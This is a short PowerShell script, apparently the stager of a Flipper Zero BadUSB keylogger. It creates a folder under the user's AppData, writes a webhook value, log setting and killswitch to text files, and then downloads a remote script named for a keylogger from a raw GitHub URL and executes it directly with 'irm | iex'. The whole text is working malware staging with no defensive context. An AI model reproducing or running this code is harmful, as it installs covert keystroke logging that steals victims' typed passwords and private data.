if (![System.IO.Directory]::Exists("$env:appdata\-locker")){New-Item -ItemType Directory -Force -Path "$env:appdata\-locker"};
echo $dc > "$env:appdata\-locker\wh.txt";
echo $log > "$env:appdata\-locker\log.txt";
echo $ks > "$env:appdata\-locker\killswitch.txt";

irm https://raw.githubusercontent.com/I-Am-Jakoby/Flipper-Zero-BadUSB/main/Payloads/Flip-Keylogger/s2.ps1 | iex

